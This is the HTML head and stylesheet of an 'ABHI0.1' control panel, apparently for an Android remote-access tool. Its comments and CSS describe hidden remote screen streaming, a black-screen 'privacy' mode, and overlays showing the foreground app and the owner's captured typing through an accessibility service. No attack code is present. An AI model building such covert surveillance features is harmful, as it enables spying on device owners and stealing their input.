<!DOCTYPE html>
<html lang="en">
<head>
    <title>ABHI0.1 · Control Panel</title>
    <meta charset="UTF-8">
    <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700&family=IBM+Plex+Mono:wght@400;500&display=swap" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@20,400,0,0" rel="stylesheet">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
    <meta name="theme-color" content="#0a0a0a">
    <link rel="icon" href="/icon.png" type="image/png">
    <script>
    /* Fail-safe loader: the dashboard must never stay trapped on the splash if
       any later script throws. Runs independently of every other asset. */
    (function () {
        function hide() {
            var el = document.getElementById('loadingOverlay');
            if (!el || el.getAttribute('data-hidden') === '1') return;
            el.setAttribute('data-hidden', '1');
            el.style.transition = 'opacity .35s ease';
            el.style.opacity = '0';
            setTimeout(function () { el.style.display = 'none'; }, 380);
        }
        window.__hideLoadingOverlay = hide;
        document.addEventListener('DOMContentLoaded', function () {
            setTimeout(hide, 900);
        });
        // Absolute ceiling: never show the spinner longer than 4s.
        setTimeout(hide, 4000);
        window.addEventListener('error', function (ev) {
            // A failed dashboard script must reveal the UI with an explanation
            // instead of an endless loader.
            setTimeout(hide, 800);
            if (ev && ev.message) {
                console.error('[dashboard] script error:', ev.message);
            }
        });
    })();
    </script>
    <style>
/* ============================================================
    ABHI0.1 Dashboard — Black + Crimson Accent
   ============================================================ */
*{box-sizing:border-box;margin:0;padding:0;font-family:'Space Grotesk',sans-serif}
:root{
  --bg:#07141f;
  --bg2:#0d1b2a;
  --bg3:#122335;
  --bg4:#1b2f45;
  --panel:rgba(12, 22, 35, 0.9);
  --panel-strong:#101d2d;
  --border:rgba(148, 163, 184, 0.14);
  --border2:rgba(124, 92, 255, 0.42);
  --primary:#7c5cff;
  --primary-2:#5ee7ff;
  --primary-soft:rgba(124, 92, 255, 0.14);
    --red:var(--primary);
    --red2:#8d6bff;
    --red3:var(--primary-soft);
  --success:#22c55e;
  --danger:#ff5f7d;
  --warning:#fbbf24;
  --text:#edf6ff;
  --text2:#b7c7d8;
  --text3:#7d8da5;
    --text-secondary:var(--text2);
    --text-muted:var(--text3);
  --online:#3dd598;
  --offline:#ff5f7d;
  --warn:#fbbf24;
  --radius:24px;
  --radius2:16px;
  --radius3:20px;
  --shadow:0 16px 40px rgba(2, 6, 23, 0.5), 0 0 0 1px rgba(124,92,255,0.06);
  --shadow-lg:0 24px 60px rgba(2, 6, 23, 0.6), 0 0 0 1px rgba(124,92,255,0.08);
  --glow:0 0 0 1px rgba(124,92,255,0.18),0 16px 32px rgba(94,231,255,0.08);
  --glass:rgba(12, 22, 40, 0.72);
  --glass-border:rgba(124, 92, 255, 0.14);
  --grad-primary:linear-gradient(135deg, #7c5cff 0%, #8d6bff 45%, #5ee7ff 100%);
}
html{height:100%;width:100%;background:var(--bg)}
body{width:100%;background:radial-gradient(circle at top left, rgba(124,92,255,0.2), transparent 30%), radial-gradient(circle at bottom right, rgba(94,231,255,0.14), transparent 35%), linear-gradient(135deg, var(--bg) 0%, #0a1728 38%, #0d1b2a 100%);color:var(--text);min-height:100dvh;overflow-x:hidden;padding-left:env(safe-area-inset-left,0px);padding-right:env(safe-area-inset-right,0px)}
body:after{content:'';position:fixed;inset:0;pointer-events:none;background:linear-gradient(rgba(94,231,255,0.025) 1px,transparent 1px),linear-gradient(90deg,rgba(94,231,255,0.025) 1px,transparent 1px);background-size:32px 32px;mask-image:linear-gradient(to bottom,rgba(0,0,0,.8),transparent 85%);z-index:-1}
::-webkit-scrollbar{width:5px;height:5px}
::-webkit-scrollbar-track{background:var(--bg)}
::-webkit-scrollbar-thumb{background:linear-gradient(180deg, var(--primary), var(--primary-2));border-radius:10px}
a{color:var(--primary-2);text-decoration:none}
button{cursor:pointer;border:none;outline:none;background:none;font-family:inherit}
input,select,textarea{font-family:inherit;background:rgba(13,24,40,0.85);border:1px solid var(--glass-border);color:var(--text);border-radius:14px;padding:11px 14px;font-size:13px;width:100%;outline:none;box-shadow:inset 0 1px 0 rgba(255,255,255,0.04);transition:border-color .2s,box-shadow .2s,background .2s;backdrop-filter:blur(8px)}
input:hover,select:hover,textarea:hover{border-color:rgba(124,92,255,0.26)}
input:focus,select:focus,textarea:focus{border-color:rgba(124,92,255,0.65);box-shadow:0 0 0 3px rgba(124,92,255,0.14),inset 0 1px 0 rgba(255,255,255,0.05);background:rgba(16,28,46,0.92)}
select option{background:var(--bg3)}

/* ---- Loading ---- */
.load{position:fixed;inset:0;z-index:99999;background:radial-gradient(circle at 50% 40%, #0d1b2a, #07141f 70%);display:flex;align-items:center;justify-content:center;flex-direction:column;gap:18px}
.load-logo{font-size:32px;font-weight:700;background:var(--grad-primary);-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent;letter-spacing:4px}
.loader{width:42px;height:42px;border:3px solid rgba(124,92,255,0.15);border-top-color:var(--primary);border-right-color:var(--primary-2);border-radius:50%;animation:spin .7s linear infinite;box-shadow:0 0 24px rgba(124,92,255,0.25)}
@keyframes spin{to{transform:rotate(360deg)}}

/* ---- Toast ---- */
.toast-container{position:fixed;bottom:20px;right:20px;z-index:99999;display:flex;flex-direction:column;gap:6px}
.toast{padding:10px 16px;border-radius:var(--radius2);background:var(--bg3);border:1px solid var(--border);color:var(--text);font-size:13px;box-shadow:var(--shadow);animation:tin .25s ease;min-width:200px;max-width:320px}
.toast.success{border-left:3px solid var(--red)}
.toast.error{border-left:3px solid #f44336}
.toast.info{border-left:3px solid #2196f3}
@keyframes tin{from{opacity:0;transform:translateX(20px)}to{opacity:1;transform:none}}
.ui-error{position:fixed;left:20px;bottom:20px;z-index:100000;display:flex;align-items:center;gap:12px;max-width:min(420px,calc(100vw - 40px));padding:12px 14px;background:rgba(18,29,45,.96);border:1px solid rgba(255,95,125,.45);border-left:3px solid var(--danger);border-radius:10px;box-shadow:0 16px 36px rgba(0,0,0,.35);color:var(--text2);font-size:12px;animation:tin .25s ease}.ui-error strong{display:block;color:#ff9caf;font-size:11px;text-transform:uppercase;letter-spacing:1px;margin-bottom:3px}.ui-error button{color:var(--text3);font-size:18px;padding:2px 4px;margin-left:auto}.ui-error button:hover{color:var(--text)}

/* ---- Layout ---- */
.shell{display:flex;width:100%;max-width:100vw;height:100dvh;overflow:hidden}

/* ---- Sidebar (Premium Glass) ---- */
.sidebar{width:232px;min-width:232px;background:linear-gradient(180deg, rgba(10,18,32,0.97), rgba(14,24,40,0.95));border-right:1px solid var(--glass-border);display:flex;flex-direction:column;overflow-y:auto;transition:transform .3s ease;z-index:100;box-shadow:6px 0 28px rgba(2, 6, 23, 0.28);backdrop-filter:blur(20px) saturate(150%);-webkit-backdrop-filter:blur(20px) saturate(150%)}
.sidebar-logo{padding:22px 18px 18px;border-bottom:1px solid var(--glass-border);background:linear-gradient(180deg, rgba(124,92,255,0.08), transparent)}
.sidebar-logo img{height:36px;width:auto;object-fit:contain;filter:drop-shadow(0 0 8px rgba(124,92,255,0.45))}
.nav-section{font-size:10px;font-weight:700;letter-spacing:1.2px;color:var(--text3);padding:14px 16px 6px;text-transform:uppercase}
.nav-item{display:flex;align-items:center;gap:10px;padding:11px 16px;cursor:pointer;transition:all .18s ease;border-left:3px solid transparent;color:var(--text2);font-size:13px;font-weight:600;user-select:none;border-radius:14px;margin:3px 10px;position:relative}
.nav-item:hover{background:rgba(124,92,255,0.10);color:var(--text)}
.nav-item.active{background:linear-gradient(135deg, rgba(124,92,255,0.22) 0%, rgba(94,231,255,0.10) 100%);border-left-color:transparent;color:#fff;box-shadow:inset 0 0 0 1px rgba(124,92,255,0.35), 0 6px 16px rgba(124,92,255,0.18)}
.nav-item.active::before{content:'';position:absolute;left:-10px;top:50%;transform:translateY(-50%);width:3px;height:60%;border-radius:2px;background:var(--grad-primary)}
.nav-item .material-symbols-outlined{font-size:18px;color:var(--text3);flex-shrink:0;transition:color .15s}
.nav-item:hover .material-symbols-outlined{color:var(--primary-2)}
.nav-item.active .material-symbols-outlined{color:var(--primary-2)}
.sidebar-footer{margin-top:auto;padding:14px 18px;font-size:11px;color:var(--text3);border-top:1px solid var(--glass-border);background:rgba(124,92,255,0.03)}

/* ---- Main ---- */
.main{flex:1;display:flex;flex-direction:column;overflow:hidden}

/* ---- Topbar (Premium Glass) ---- */
.topbar{height:62px;background:rgba(9,17,28,0.65);backdrop-filter:blur(20px) saturate(160%);-webkit-backdrop-filter:blur(20px) saturate(160%);border-bottom:1px solid var(--glass-border);display:flex;align-items:center;padding:0 20px;gap:12px;flex-shrink:0;box-shadow:0 8px 32px rgba(2,6,23,0.24)}
.topbar-menu{display:none;align-items:center;justify-content:center;width:36px;height:36px;border-radius:var(--radius2);background:transparent;color:var(--text2);transition:background .15s}
.topbar-menu:hover{background:rgba(124,92,255,0.08)}
.topbar-title{font-size:15px;font-weight:700;color:var(--text);flex:1;letter-spacing:0.2px}
.topbar-badge{display:flex;align-items:center;gap:6px;font-size:12px;color:var(--text2);padding:6px 10px;border-radius:999px;background:rgba(124,92,255,0.08);border:1px solid rgba(124,92,255,0.18)}
.topbar-dot{width:7px;height:7px;border-radius:50%;background:var(--offline)}
.topbar-dot.online{background:var(--online)}

/* ---- Content ---- */
.content{flex:1;overflow-y:auto;padding:20px}
.tab-view{display:none}
.tab-view.active{display:block}

/* ---- Section title ---- */
.page-title{font-size:18px;font-weight:600;color:var(--text);margin-bottom:16px}
.page-sub{font-size:13px;color:var(--text2);margin-bottom:16px}

/* ---- Card (Premium Glass) ---- */
.card{
  background:linear-gradient(165deg, rgba(18,30,50,0.88) 0%, rgba(10,18,32,0.92) 100%);
  border:1px solid var(--glass-border);
  border-radius:var(--radius);
  padding:20px;
  box-shadow:var(--shadow);
  backdrop-filter:blur(16px) saturate(140%);
  -webkit-backdrop-filter:blur(16px) saturate(140%);
  position:relative;
  overflow:hidden;
  transition:border-color .25s ease, box-shadow .25s ease, transform .25s ease;
}
.card::before{
  content:'';position:absolute;top:0;left:0;right:0;height:1px;
  background:linear-gradient(90deg, transparent, rgba(124,92,255,0.4), rgba(94,231,255,0.3), transparent);
  opacity:.7;pointer-events:none;
}
.card:hover{
  border-color:rgba(124,92,255,0.28);
  box-shadow:var(--shadow-lg);
}
.card+.card{margin-top:16px}
.card-title{font-size:13px;font-weight:700;color:var(--text);margin-bottom:14px;display:flex;align-items:center;gap:8px}
.card-title .material-symbols-outlined{font-size:16px;color:var(--primary-2)}

/* ---- Device Cards ---- */
.devices-list{display:flex;flex-direction:column;gap:10px}
.device-card{background:linear-gradient(165deg, rgba(18,30,50,0.8), rgba(11,19,33,0.85));border:1px solid var(--glass-border);border-radius:var(--radius2);padding:16px 18px;cursor:pointer;transition:all .22s cubic-bezier(0.16,1,0.3,1);position:relative;backdrop-filter:blur(10px)}
.device-card::before{content:'';position:absolute;top:0;left:0;right:0;height:1px;background:linear-gradient(90deg,transparent,rgba(124,92,255,0.35),transparent);opacity:.6;pointer-events:none}
.device-card:hover{border-color:rgba(124,92,255,0.35);background:linear-gradient(165deg, rgba(22,36,58,0.88), rgba(14,24,40,0.9));transform:translateY(-2px);box-shadow:0 12px 32px rgba(2,6,23,0.4),0 0 0 1px rgba(124,92,255,0.15)}
.device-card.selected{border-color:rgba(124,92,255,0.55);background:linear-gradient(165deg, rgba(25,40,66,0.92), rgba(16,28,48,0.95));box-shadow:0 12px 36px rgba(124,92,255,0.22),inset 0 0 0 1px rgba(124,92,255,0.25)}
.device-card-top{display:flex;align-items:center;gap:12px}
.device-card-dot{width:9px;height:9px;border-radius:50%;flex-shrink:0;background:var(--offline)}
.device-card-dot.online{background:var(--online);box-shadow:0 0 6px rgba(76,175,80,0.6)}
.device-card-name{font-size:14px;font-weight:600;color:var(--text);flex:1}
.device-card-status{font-size:11px;color:var(--text3);margin-left:auto}
.device-card-status.online{color:var(--online)}
.device-card-meta{display:flex;gap:16px;margin-top:10px;flex-wrap:wrap}
.device-meta-item{display:flex;align-items:center;gap:5px;font-size:12px;color:var(--text2)}
.device-meta-item .material-symbols-outlined{font-size:14px;color:var(--text3)}
.battery-bar{width:60px;height:5px;background:rgba(255,255,255,0.1);border-radius:3px;overflow:hidden;margin-top:2px}
.battery-fill{height:100%;background:var(--online);border-radius:3px;transition:width .5s}
.battery-fill.warn{background:var(--warn)}
.battery-fill.low{background:var(--offline)}
.device-empty{text-align:center;padding:48px 16px;color:var(--text3);font-size:14px}
.device-empty .material-symbols-outlined{font-size:48px;opacity:0.3;display:block;margin-bottom:8px}

/* ---- Buttons (Premium Rounded) ---- */
.btn{display:inline-flex;align-items:center;gap:6px;padding:9px 18px;border-radius:14px;font-size:13px;font-weight:600;transition:all .2s cubic-bezier(0.16,1,0.3,1);cursor:pointer;border:none;outline:none;letter-spacing:.01em}
.btn .material-symbols-outlined{font-size:15px}
.btn-red{background:var(--grad-primary);color:#fff;box-shadow:0 8px 24px rgba(124,92,255,0.32),inset 0 1px 0 rgba(255,255,255,0.2)}.btn-red:hover{filter:brightness(1.08);transform:translateY(-1px);box-shadow:0 12px 32px rgba(124,92,255,0.42),inset 0 1px 0 rgba(255,255,255,0.2)}
.btn-outline{background:rgba(124,92,255,0.04);color:var(--text2);border:1px solid var(--glass-border);border-radius:14px}.btn-outline:hover{border-color:rgba(94,231,255,0.5);color:var(--text);background:rgba(124,92,255,0.08);box-shadow:0 4px 16px rgba(94,231,255,0.12)}
.btn-ghost{background:rgba(148,163,184,0.06);color:var(--text2);border-radius:14px}.btn-ghost:hover{background:rgba(148,163,184,0.12);transform:translateY(-1px)}
.btn-danger{background:linear-gradient(135deg, rgba(255,95,125,0.2), rgba(255,95,125,0.1));color:#ff8aa3;border:1px solid rgba(255,95,125,0.28);border-radius:14px;box-shadow:0 4px 16px rgba(255,95,125,0.08)}.btn-danger:hover{filter:brightness(1.08);transform:translateY(-1px)}
.btn-sm{padding:6px 12px;font-size:12px;border-radius:12px}
.btn-sm .material-symbols-outlined{font-size:14px}
.btn-row{display:flex;flex-wrap:wrap;gap:8px;margin-top:8px}
button:focus-visible,.btn:focus-visible,.qbtn:focus-visible,.hbnc-tb-btn:focus-visible,.hbnc-ws-action:focus-visible,.moremenu-item:focus-visible,.hw-qual-opt:focus-visible,.hbnc-start-item:focus-visible{outline:2px solid var(--primary-2);outline-offset:2px}
.btn:disabled{opacity:.5;cursor:not-allowed;filter:grayscale(.35);box-shadow:none}

/* ---- Panel header ---- */
.panel-hdr{display:flex;align-items:center;gap:10px;margin-bottom:16px;flex-wrap:wrap}
.panel-hdr h2{font-size:16px;font-weight:600;color:var(--text);flex:1}
.panel-actions{display:flex;gap:8px;flex-wrap:wrap}

/* ---- Status dot ---- */
.dot{width:7px;height:7px;border-radius:50%;display:inline-block;flex-shrink:0}
.dot.online{background:var(--online);box-shadow:0 0 5px rgba(76,175,80,0.7)}
.dot.offline{background:var(--offline)}
.dot.connecting{background:var(--warn);animation:pulse .8s infinite}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:.4}}

/* ---- Quick Actions Bar (Premium) ---- */
.qbar{display:flex;gap:10px;flex-wrap:wrap;margin-bottom:20px}
.qbtn{display:flex;flex-direction:column;align-items:center;gap:6px;padding:14px 16px;background:linear-gradient(165deg, rgba(18,30,50,0.75), rgba(11,19,33,0.8));border:1px solid var(--glass-border);border-radius:var(--radius2);cursor:pointer;min-width:72px;transition:all .22s cubic-bezier(0.16,1,0.3,1);color:var(--text2);backdrop-filter:blur(10px)}
.qbtn:hover{border-color:rgba(124,92,255,0.4);background:linear-gradient(165deg, rgba(22,36,58,0.85), rgba(14,24,40,0.88));color:var(--text);transform:translateY(-3px);box-shadow:0 12px 28px rgba(124,92,255,0.18)}
.qbtn .material-symbols-outlined{font-size:22px;color:var(--primary-2)}
.qbtn span:last-child{font-size:11px;font-weight:600;letter-spacing:.01em}

/* ---- HBNC Workspace ---- */
body.hbnc-mode .shell>.sidebar{display:none}
body.hbnc-mode .topbar{display:none}
body.hbnc-mode .content{padding:0}
.hbnc-shell{display:flex;height:100%;overflow:hidden}
.hbnc-toolbar{width:48px;background:var(--bg2);border-right:1px solid var(--border);display:flex;flex-direction:column;align-items:center;padding:6px 0;gap:2px;flex-shrink:0;overflow-y:auto}
.hbnc-tb-btn{width:36px;height:36px;display:flex;align-items:center;justify-content:center;border-radius:var(--radius2);color:var(--text3);transition:background .15s,color .15s;cursor:pointer}
.hbnc-tb-btn:hover{background:rgba(255,255,255,0.07);color:var(--text)}
.hbnc-tb-btn:active,.hbnc-ws-action:active,.btn:active{transform:translateY(1px)}
.hbnc-tb-btn.active{background:var(--red3);color:var(--red)}
.hbnc-tb-btn .material-symbols-outlined{font-size:18px}
.hbnc-divider{width:28px;height:1px;background:var(--border);margin:4px 0}
.hbnc-tb-spacer{flex:1}
.hbnc-workspace{flex:1;overflow:hidden;display:flex;flex-direction:column}
.hbnc-ws{flex:1;display:none;flex-direction:column;overflow:hidden}
.hbnc-ws.active{display:flex}
.hbnc-ws-hdr{display:flex;align-items:center;gap:8px;padding:8px 12px;border-bottom:1px solid var(--border);flex-shrink:0;font-size:12px}
.hbnc-ws-label{font-weight:500;color:var(--text);flex:1}
.hbnc-ws-ctrls{display:flex;gap:4px;margin-left:auto}
.hbnc-ws-body{flex:1;overflow:hidden;position:relative}
.hbnc-screen-area{width:100%;height:100%;position:relative;display:flex;align-items:center;justify-content:center;background:#000;overflow:hidden;flex:1 1 auto;min-width:0;min-height:0}
/* The wrapper must fill the screen area, never size itself to the current
   quality preset. When it was shrink-to-fit, changing 720p -> 144p shrank the
   wrapper (and the video panel) instead of only lowering the encoded pixels. */
.hbnc-canvas-wrap{position:relative;width:100%;height:100%;display:flex;align-items:center;justify-content:center;max-width:none;max-height:none;min-width:0;min-height:0}
#hbcnCanvas{display:block;flex:0 0 auto;max-width:100%;max-height:100%;object-fit:contain;cursor:crosshair;touch-action:none}
.hbnc-placeholder{display:flex;flex-direction:column;align-items:center;justify-content:center;gap:8px;color:var(--text3);font-size:13px;padding:32px}
.hbnc-placeholder .material-symbols-outlined{font-size:48px;opacity:0.3}
.hbnc-error{position:absolute;inset:0;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:8px;background:rgba(0,0,0,0.7);backdrop-filter:blur(4px);color:var(--text2);font-size:13px}
.hbnc-error .material-symbols-outlined{font-size:32px;opacity:0.5}
.hbnc-retry-btn{margin-top:4px;padding:6px 14px;background:var(--red);color:#fff;border-radius:var(--radius2);font-size:12px;cursor:pointer;border:none}
.hbnc-ws-bar{display:flex;gap:4px;padding:6px;border-top:1px solid var(--border);flex-shrink:0;flex-wrap:wrap;align-items:stretch}
.hbnc-ws-action{display:flex;align-items:center;gap:3px;padding:4px 8px;background:rgba(255,255,255,0.06);border:1px solid var(--border);border-radius:var(--radius2);font-size:11px;color:var(--text2);cursor:pointer;transition:all .15s;min-height:34px}
.hbnc-ws-action:hover{background:rgba(255,255,255,0.1);color:var(--text)}
.hbnc-ws-action.danger{background:rgba(229,57,53,0.12);border-color:var(--border2);color:var(--red)}
.hbnc-ws-action .material-symbols-outlined{font-size:14px}
/* Start menu — choose stream mode (H.264 video / JPEG frames) */
.hbnc-ws-bar{position:relative}
#hwStartMenu{display:none;position:absolute;bottom:calc(100% + 6px);left:8px;z-index:50;background:var(--bg2);border:1px solid var(--border);border-radius:var(--radius2);box-shadow:0 8px 24px rgba(0,0,0,0.45);min-width:230px;overflow:hidden}
.hbnc-start-item{display:flex;align-items:center;gap:10px;padding:10px 12px;cursor:pointer;color:var(--text2);transition:all .15s;border-left:3px solid transparent}
.hbnc-start-item:hover{background:rgba(255,255,255,0.08);color:var(--text)}
.hbnc-start-item.active{border-left-color:var(--primary-2);color:var(--text);background:rgba(255,255,255,0.05)}
.hbnc-start-item .material-symbols-outlined{font-size:18px}
.hsi-title{font-size:12px;font-weight:600}
.hsi-sub{font-size:10px;color:var(--text3);margin-top:1px}
/* Quality selector */
.hw-quality-wrap{display:flex;align-items:center;gap:6px;flex-wrap:wrap}
.hw-quality-lbl{font-size:11px;color:var(--text3)}
.hw-quality-sel{padding:6px 8px;background:rgba(255,255,255,0.06);border:1px solid var(--border);border-radius:var(--radius2);font-size:12px;color:var(--text2);cursor:pointer;transition:all .15s;font-family:inherit}
.hw-quality-sel:hover{background:rgba(255,255,255,0.1);color:var(--text)}
.hw-quality-sel:disabled{opacity:.5;cursor:not-allowed}
.hw-quality-sel option{background:var(--bg2);color:var(--text)}
.hw-quality-state{font-size:10px;color:var(--text3);min-width:0}
.hw-quality-state.ok{color:#4caf50}
.hw-quality-state.err{color:var(--red)}
.hw-quality-state.busy{color:var(--text2)}
/* Streaming mode selector + independent Screen Reader toggle */
.hw-mode-wrap{display:flex;align-items:center;gap:6px}
.hw-scread-wrap{display:flex;align-items:center}
.hw-scread-btn{display:inline-flex;align-items:center;gap:5px;padding:6px 10px;background:rgba(255,255,255,0.06);border:1px solid var(--border);border-radius:var(--radius2);font-size:12px;color:var(--text2);cursor:pointer;transition:all .15s;font-family:inherit}
.hw-scread-btn .material-symbols-outlined{font-size:16px}
.hw-scread-btn:hover{background:rgba(255,255,255,0.1);color:var(--text)}
.hw-scread-btn[aria-busy="true"]{opacity:.6;cursor:progress}
.hw-scread-btn.active{background:rgba(76,175,80,0.16);border-color:rgba(76,175,80,0.5);color:#7fe085}
.hw-scread-state{font-size:10px;font-weight:600;padding:1px 5px;border-radius:8px;background:rgba(255,255,255,0.08);color:var(--text3)}
.hw-scread-btn.active .hw-scread-state{background:rgba(76,175,80,0.25);color:#a5f0ab}

/* ---- Screen Reader: premium glass control + dedicated viewer ---- */
.hw-scread-wrap{position:relative}
.hw-scread-btn.mode-both{background:rgba(94,231,255,.13);border-color:rgba(94,231,255,.42);color:#a9ecff}
.hw-scread-btn.mode-reader{background:rgba(124,92,255,.18);border-color:rgba(124,92,255,.52);color:#cabfff}
.hw-scread-btn.service-on .hw-scread-state{background:rgba(76,175,80,.25);color:#a5f0ab}
.hw-reader-menu{visibility:hidden;opacity:0;position:absolute;left:50%;bottom:calc(100% + 10px);z-index:75;
  transform:translateX(-50%) translateY(6px);width:min(286px,calc(100vw - 16px));padding:12px;
  background:linear-gradient(165deg,rgba(16,23,36,.98),rgba(7,11,18,.99));
  border:1px solid rgba(94,231,255,.22);border-radius:16px;
  box-shadow:0 22px 60px rgba(0,0,0,.65),inset 0 1px 0 rgba(255,255,255,.06);
  -webkit-backdrop-filter:blur(18px);backdrop-filter:blur(18px);
  pointer-events:none;transition:opacity .16s ease,transform .16s ease,visibility 0s linear .16s}
.hw-reader-menu.open{visibility:visible;opacity:1;transform:translateX(-50%) translateY(0);
  pointer-events:auto;transition:opacity .16s ease,transform .16s ease,visibility 0s}
.hw-rm-head{display:flex;align-items:center;gap:9px}
.hw-rm-ico{font-size:18px;color:#7fe0ff;background:rgba(94,231,255,.12);border:1px solid rgba(94,231,255,.25);
  width:32px;height:32px;border-radius:10px;display:flex;align-items:center;justify-content:center;flex:0 0 auto}
.hw-rm-title{font-size:12.5px;font-weight:700;color:var(--text);line-height:1.15;display:flex;flex-direction:column;gap:1px}
.hw-rm-title small{font-size:9.5px;font-weight:500;color:var(--text3)}
.hw-rm-live{margin-left:auto;font-size:9px;font-weight:800;letter-spacing:.1em;padding:3px 7px;border-radius:999px;
  background:rgba(255,255,255,.06);color:var(--text3);flex:0 0 auto}
.hw-rm-live.on{background:rgba(76,175,80,.18);color:#8cf0a0;box-shadow:0 0 0 1px rgba(76,175,80,.35)}
.hw-rm-seg{display:grid;grid-template-columns:repeat(2,1fr);gap:4px;margin:11px 0 8px;padding:4px;
  border:1px solid var(--border);border-radius:12px;background:rgba(255,255,255,.035)}
.hw-rm-seg button{min-height:34px;border:0;border-radius:9px;background:transparent;color:var(--text3);
  font:inherit;font-size:10.5px;font-weight:700;letter-spacing:.02em;cursor:pointer;transition:.15s}
.hw-rm-seg button:hover{color:var(--text2)}
.hw-rm-seg button[aria-pressed="true"]{color:#fff;background:linear-gradient(135deg,rgba(94,231,255,.24),rgba(124,92,255,.24));
  box-shadow:inset 0 0 0 1px rgba(94,231,255,.38),0 4px 12px rgba(0,0,0,.3)}
.hw-rm-row{display:flex;align-items:center;justify-content:space-between;gap:8px;min-height:36px;padding:2px 0}
.hw-rm-k{font-size:10.5px;color:var(--text3)}
.hw-rm-toggle{min-width:56px;height:28px;border-radius:999px;border:1px solid var(--border);background:rgba(255,255,255,.05);
  color:var(--text3);font:inherit;font-size:9.5px;font-weight:800;letter-spacing:.08em;cursor:pointer;transition:.15s}
.hw-rm-toggle[aria-checked="true"]{background:#4ed37f;border-color:#4ed37f;color:#062315;box-shadow:0 0 14px rgba(78,211,127,.35)}
.hw-rm-zoom{display:flex;gap:5px}
.hw-rm-zoom button{width:32px;height:30px;border-radius:9px;border:1px solid var(--border);background:rgba(255,255,255,.05);
  color:var(--text2);display:flex;align-items:center;justify-content:center;cursor:pointer;font:inherit}
.hw-rm-zoom button:hover{background:rgba(255,255,255,.1);color:var(--text)}
.hw-rm-zoom .material-symbols-outlined{font-size:15px}
.hw-rm-foot{display:flex;justify-content:space-between;gap:8px;margin-top:7px;padding-top:8px;
  border-top:1px solid var(--border);font-size:9.5px;color:var(--text3);font-variant-numeric:tabular-nums}

/* Ambient fill removes the black letterbox without stretching the real frame. */
.hw-ambient{position:absolute;inset:0;width:100%;height:100%;display:none;pointer-events:none;z-index:0;
  object-fit:cover;filter:blur(32px) saturate(1.15) brightness(.42);transform:scale(1.1)}
#hbcn #hbcnCanvas,#hbcn #webpFrameImg{position:relative;z-index:2}
.hw-reader-viewer{position:absolute;z-index:5;display:none;overflow:hidden;background:#04070c;pointer-events:none;
  border:1px solid rgba(94,231,255,.45);box-shadow:0 18px 48px rgba(0,0,0,.6)}
.hw-reader-viewer img{width:100%;height:100%;object-fit:contain;display:block}
.hw-reader-viewer.hw-reader-mirror img{object-fit:fill}
.hw-reader-select-overlay{position:absolute;inset:0;display:none;pointer-events:none;z-index:6}
.hw-reader-viewer.hw-reader-select .hw-reader-select-overlay{display:block;pointer-events:auto}
.hw-reader-select-box{position:absolute;border:2px solid #5ee7ff;background:rgba(94,231,255,.18);box-shadow:0 0 0 1px rgba(0,0,0,.4);cursor:pointer;pointer-events:auto}
.hw-reader-select-box.active{border-color:#7fe085;background:rgba(127,224,133,.22)}
.hw-reader-app{position:absolute;top:7px;right:7px;max-width:70%;padding:3px 8px;border-radius:8px;background:rgba(4,8,14,.82);
  border:1px solid rgba(94,231,255,.35);color:#bfefff;font-size:11px;font-family:'IBM Plex Mono',monospace;
  white-space:nowrap;overflow:hidden;text-overflow:ellipsis;pointer-events:none;z-index:7}
.hw-reader-typing{position:absolute;left:7px;bottom:7px;max-width:92%;padding:5px 9px;border-radius:9px;background:rgba(4,8,14,.86);
  border:1px solid rgba(127,224,133,.4);color:#d9ffe0;font-size:12px;font-family:'IBM Plex Mono',monospace;
  white-space:pre-wrap;word-break:break-all;pointer-events:none;z-index:7;display:none}
.hw-reader-typing.on{display:block}
.hw-reader-tag{position:absolute;top:7px;left:7px;display:flex;align-items:center;gap:4px;padding:3px 7px 3px 5px;
  border-radius:999px;background:rgba(3,7,12,.72);border:1px solid rgba(94,231,255,.35);color:#bfefff;
  font-size:9px;font-weight:800;letter-spacing:.13em;-webkit-backdrop-filter:blur(8px);backdrop-filter:blur(8px)}
.hw-reader-tag .material-symbols-outlined{font-size:12px}
.hw-reader-wait{position:absolute;inset:0;display:flex;align-items:center;justify-content:center;
  color:var(--text3);font-size:10px;letter-spacing:.04em;text-align:center;padding:12px}
#hbcn[data-reader-ready="1"][data-reader-mode="both"] .hw-reader-viewer{display:block;right:10px;bottom:10px;width:min(42%,214px);
  aspect-ratio:9/18.5;border-radius:16px}
#hbcn[data-reader-ready="1"][data-reader-mode="reader"] .hw-reader-viewer{display:block;inset:0;border:0;border-radius:0}
#hbcn[data-reader-ready="1"][data-reader-mode="reader"] #hbcnCanvas,
#hbcn[data-reader-mode="reader"] #webpFrameImg,
#hbcn[data-reader-mode="reader"] .hw-ambient,
#hbcn[data-reader-mode="reader"] .hbnc-placeholder{display:none!important}
/* Privacy view: black-screen + H.264. MediaProjection only yields black frames,
   so the reader skeleton becomes the panel's live source instead. */
/* Only swap to the skeleton once a reader frame is actually on screen. While
   the reader is still connecting the live canvas stays visible, so a stalled
   accessibility service can never leave the panel on a blank black screen. */
#hbcn[data-privacy="ready"] #hbcnCanvas,
#hbcn[data-privacy="ready"] #webpFrameImg,
#hbcn[data-privacy="ready"] #hbcnAmbient,
#hbcn[data-privacy="ready"] #webpAmbientImg,
#hbcn[data-privacy="ready"] .hbnc-placeholder{display:none!important}
#hbcn[data-privacy="ready"] .hw-reader-viewer{display:block;inset:0;border:0;border-radius:0;background:#000}
#hbcn[data-privacy="pending"] .hw-reader-viewer{display:none!important}
/* The reader-mode rule above hides the canvas; while privacy is pending the
   live frame must stay on screen until the first skeleton frame lands. */
#hbcn[data-privacy="pending"] #hbcnCanvas,
#hbcn[data-privacy="pending"] #webpFrameImg,
#hbcn[data-privacy="pending"] .hw-ambient{display:block!important}
.hw-privacy-note{position:absolute;top:8px;right:8px;z-index:12;display:flex;gap:8px;align-items:flex-start;
  max-width:min(340px,74%);padding:8px 11px;border-radius:12px;border:1px solid rgba(94,231,255,.35);
  background:rgba(4,12,20,.9);-webkit-backdrop-filter:blur(10px);backdrop-filter:blur(10px);
  color:#d8ecf8;font-size:11px;line-height:1.45;box-shadow:0 10px 28px rgba(0,0,0,.5)}
.hw-privacy-note[hidden]{display:none}
.hw-privacy-note .material-symbols-outlined{font-size:15px;color:var(--primary-2);flex-shrink:0}
